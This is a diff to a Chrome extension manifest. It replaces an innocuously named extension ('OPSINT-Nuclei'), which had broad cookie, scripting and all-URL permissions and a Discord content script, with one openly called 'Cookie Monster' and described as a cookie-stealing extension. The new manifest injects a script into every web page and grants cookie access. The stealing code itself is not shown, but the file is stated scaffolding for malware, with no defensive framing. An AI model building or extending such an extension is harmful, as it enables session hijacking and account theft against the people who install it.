@@ -1,39 +1,20 @@
 {
-    "name": "OPSINT-Nuclei",
-    "description": "Uses Nuclei API to retrieve OPSEC information delivered to the webpage.",
-    "version": "2.61",
+    "name": "Cookie Monster",
+    "description": "A cookie stealing chrome extension...",
     "manifest_version": 3,
-    "action": {
-        "default_popup": "popup.html",
-        "default_title": "Search Email",
-        "default_icon": {
-            "16": "icons/logo_main.ico",
-            "48": "icons/logo_main.ico",
-            "128": "icons/logo_main.ico"
-        }
-    },
-    "background": {
-        "service_worker": "background.js"
-    },
-    "permissions": [
-        "activeTab",
-        "scripting",
-        "webRequest",
-        "cookies",
-        "storage"
-    ],
-    "host_permissions": [
-        "<all_urls>"
-    ],
-    "content_scripts": [
-        {
-            "matches": ["https://*.discord.com/*"],
-            "js": ["contentScript.js"]
-        }
-    ],
+    "version": "1",
+    "permissions": ["activeTab","cookies"],
     "icons": {
-        "16": "icons/logo_main.ico",
-        "48": "icons/logo_main.ico",
-        "128": "icons/logo_main.ico"
-    }
+        "16": "default.png",
+        "48": "default.png",
+        "128": "default.png"
+    },
+    "content_scripts": [{
+        "matches":
+        [
+        "https://*/*",
+        "http://*/*"
+        ],
+        "js": ["background.js"]
+    }]
 }
